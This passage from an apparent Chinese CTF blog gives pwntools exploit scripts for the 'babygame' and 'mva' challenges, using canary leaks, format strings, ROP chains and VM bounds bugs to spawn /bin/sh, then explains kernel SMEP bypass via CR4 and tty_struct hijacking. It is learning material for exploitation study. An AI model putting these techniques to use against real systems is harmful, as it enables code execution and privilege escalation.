EXIT?&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;y&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x460</span>-<span class="number">1</span>)</span><br><span class="line">    payload+=p64(pop_rax_ret)+p64(bss)</span><br><span class="line">    payload+=p64(rsi)+p64(<span class="number">0</span>)+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload+=p64(rdx)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi)+p64(<span class="number">0xc000108000</span>)+<span class="string">&#x27;d&#x27;</span>*<span class="number">0xb8</span></span><br><span class="line">    payload+=p64(pop_rax_ret)+p64(<span class="number">59</span>)+p64(syscall_ret)</span><br><span class="line">    exit(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OKAY YOU CAN LEAVE YOUR NAME AND BYE~&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>栈溢出加格式化字符串，先通过溢出得到一个栈地址和canary,然后通过格式化字符串得到一个libc地址，爆破改返回地址为fread,不能直接改到main函数，不然标准输入输出在没有关闭的情况下会再打开一次，然后printf会报错。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000047400: pop rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000023b72: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002604f: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x0000000000119241: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">0x00000000000630d9: syscall; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>():</span></span><br><span class="line">    fd=<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r+&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        content=<span class="string">&quot;round &#123;0&#125;: \n&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(content)</span><br><span class="line">        sh.sendline(fd.read(<span class="number">1</span>))</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot; b *(0x7ffff7fc6000+0x1565)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x108</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">    sh.sendafter(<span class="string">&quot;Please input your name:\n&quot;</span>,payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">    canary=u64(sh.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">    stack_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line">    game()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Good luck to you.&quot;</span>)</span><br><span class="line">    fmt=<span class="string">&#x27;%3$p&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x74Aa</span>-<span class="number">0xe</span>)+<span class="string">&#x27;c%8$hn&#x27;</span>+p64(stack_addr-<span class="number">0x210</span>)</span><br><span class="line">    <span class="comment"># print len(&#x27;%3$p&#x27;+&#x27;%&#x27;+str(0x7465-0xe)+&#x27;c%8$hn&#x27;)</span></span><br><span class="line">    sh.send(fmt)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    s=sh.recvline()</span><br><span class="line">    m=sh.recv()</span><br><span class="line">    libc_addr=<span class="built_in">int</span>(m[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)-<span class="number">0x10e002</span></span><br><span class="line">    pop_rax=libc_addr+<span class="number">0x0000000000047400</span></span><br><span class="line">    pop_rdi=libc_addr+<span class="number">0x0000000000023b72</span></span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12=libc_addr+<span class="number">0x0000000000119241</span></span><br><span class="line">    syscall=libc_addr+<span class="number">0x00000000000630d9</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please input your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">59</span>)+p64(pop_rdi)+p64(stack_addr-<span class="number">0x208</span>)+p64(pop_rsi)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(pop_rdx_r12)+<span class="number">2</span>*p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;2. paper&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;12345&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h2><p>第一次做vm题，这个应该算是比较简单的vm题，程序虚拟了几个指令集，包括<code>push,pop,add sub mov xor add or</code>等，然后还虚拟了六个寄存器 ，每次读取四个字节，第一个字节是指令码，比如add是<code>\x02</code>,第二个字节是目的寄存器，第三第四个寄存器是操作数比如<code>\x02\x00\x01\x02</code>就是把第二个寄存器的数和第0个寄存器的数相加然后赋值给第一个寄存器。</p>
<p>漏洞就出在对边界的检查不规范导致了内存写和内存读。</p>
<p>正常有六个寄存器，选项1是对单个寄存器进行赋值，选项2,3,4,5,6,7是对寄存器进行计算，选项9是<br>入栈操作，这个可以利用v9完成返回地址写，选项a是出栈操作，可以利用v9进行返回地址的读。选项d可以进行一个<br>小范围的读，选项e可以进行小范围的读，选项e可以进行小范围的写，通过这个改写v9。</p>
<p>通过上面的几个漏洞的组合就能getshell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./mva&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe6c7e execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=<span class="number">0xe6c81</span></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *(0x7ffff7fc6000+0x1A62)&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;[+] Welcome to MVA, input your code now :&quot;</span>)</span><br><span class="line">addr_offset=<span class="number">0x270b3</span></span><br><span class="line">pay=<span class="string">&#x27;\x01\x00\x01\x0f&#x27;</span><span class="comment">#s0=0x110</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf6\x00&#x27;</span><span class="comment">#v9=s0=0x110</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x01\x00\x00&#x27;</span><span class="comment">#s1=(ret_addr&amp;0xffff00000000)&gt;&gt;32</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x02\x00\x00&#x27;</span><span class="comment">#s2=(ret_addr&amp;0xffff0000)&gt;&gt;16</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0a\x03\x00\x00&#x27;</span><span class="comment">#s3=(ret_addr&amp;0xfffff)</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x70\xb3&#x27;</span><span class="comment">#s0=0x70b3</span></span><br><span class="line">pay+=<span class="string">&#x27;\x03\x03\x03\x00&#x27;</span><span class="comment">#s3=s3-s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x02&#x27;</span><span class="comment">#s0=0x2</span></span><br><span class="line">pay+=<span class="string">&#x27;\x03\x02\x02\x00&#x27;</span><span class="comment">#s2=s2-s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00&#x27;</span>+p8(<span class="number">0x6c</span>)+p8(<span class="number">0x81</span>)<span class="comment">#s0=0x6c81</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x03\x03\x00&#x27;</span><span class="comment">#s3=s3+s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00&#x27;</span>+p8(<span class="number">0xe</span>)<span class="comment">#s0=0xe</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x02\x02\x00&#x27;</span><span class="comment">#s2=s2+s0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x01\x0c&#x27;</span><span class="comment">#s0=0x10c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf6\x00&#x27;</span><span class="comment">#v9&amp;0xffff=07x10c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x80\x00&#x27;</span><span class="comment">#s0=0x8000</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf9\x00&#x27;</span><span class="comment">#v9=0x800000000000010c</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x00&#x27;</span><span class="comment">#s0=0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x00\x03\x00&#x27;</span><span class="comment">#s0=s3</span></span><br><span class="line">pay+=<span class="string">&#x27;\x09\x00\x00\x00&#x27;</span></span><br><span class="line">pay+=<span class="string">&#x27;\x01\x00\x00\x00&#x27;</span><span class="comment">#s0=0</span></span><br><span class="line">pay+=<span class="string">&#x27;\x02\x00\x02\x00&#x27;</span><span class="comment">#s0=s2</span></span><br><span class="line">pay+=<span class="string">&#x27;\x09\x00\x00\x00&#x27;</span></span><br><span class="line">sh.sendline(pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/smep%E7%BB%95%E8%BF%87%E5%8F%8Atty-opertions/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/12/smep%E7%BB%95%E8%BF%87%E5%8F%8Atty-opertions/" class="post-title-link" itemprop="url">smep绕过及tty_opertions</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-12 01:59:36 / 修改时间：02:01:05" itemprop="dateCreated datePublished" datetime="2022-03-12T01:59:36+08:00">2022-03-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="smep绕过"><a href="#smep绕过" class="headerlink" title="smep绕过"></a>smep绕过</h1><h2 id="0x1-smep机制"><a href="#0x1-smep机制" class="headerlink" title="0x1 smep机制"></a>0x1 smep机制</h2><p>smep是内核态的一种保护机制，当CPU处于内核态的时候，即处于ring0的时候不允许访问用户态的代码，所以上篇的ret2user就直接不能使用了。</p>
<p>但是也有绕过办法，这个实现smep的机制密不可分，系统会通过cr4的第20位是否为1判断是否开启了smep,只要能执行rop然后mov改变cr4的第二十位为0就行，然后就可以执行用户态的代码了。</p>
<h2 id="0x2-tty-struct"><a href="#0x2-tty-struct" class="headerlink" title="0x2 tty_struct"></a>0x2 tty_struct</h2><p>当用户打开ptmx驱动的时候会给其分配一个tty_struct结构，具体定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span>  </span><br><span class="line">    <span class="keyword">int</span> magic;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span>  </span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>  </span><br><span class="line">    <span class="keyword">int</span> index;  </span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span>  </span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;  </span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;  </span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span>  </span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;  </span><br><span class="line">    <span class="keyword">int</span> count;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span>  </span><br><span class="line">              flow_stopped:<span class="number">1</span>,  </span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">int</span> hw_stopped;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span>  </span><br><span class="line">              packet:<span class="number">1</span>,  </span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span>  </span><br><span class="line">    <span class="keyword">int</span> flow_change;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span>  </span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;  </span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span>  </span><br><span class="line">    <span class="keyword">void</span> *disc_data;  </span><br><span class="line">    <span class="keyword">void</span> *driver_data;  </span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096  </span></span><br><span class="line">    <span class="keyword">int</span> closing;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;  </span><br><span class="line">    <span class="keyword">int</span> write_cnt;  </span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span>  </span><br><span class="line">&#125; __randomize_layout;  </span><br></pre></td></tr></table></figure>

<p>然后有一个类似虚表指针<code>const struct tty_operations *ops</code>,这个指针指向一个这样的虚表，里面储存了大量的函数地址，可以把这个设备当成c+++中的一个对象，当对这个对象执行虚函数的时候会从这个虚表中找到对应函数的地址然后在执行，可见执行<code>open() read() write() close() </code>的时候都会从这个虚表中找函数地址，只要我们能伪<code>tty_struct</code>就可以间接控制<code>tty_operations</code>了，通过修改虚表中函数地址来控制程序流了，其中write()处于ty_operations[7],当程序执行虚表函数的时候rax就永远指向虚表第一项，所以可以结合write和rax来完成rop。(感觉很像house of kiwi,都是通过一个固定寄存器和相对调用完成rop)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,  </span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span>  </span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);  </span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);  </span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,  </span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);  </span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);  </span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,  </span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);  </span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,  </span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);  </span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);  </span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);  </span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);  </span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);  </span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);  </span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);  </span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);  </span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,  </span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);  </span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);  </span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);  </span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,  </span><br><span class="line">                struct serial_icounter_struct *icount);  </span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);  </span><br><span class="line"><span 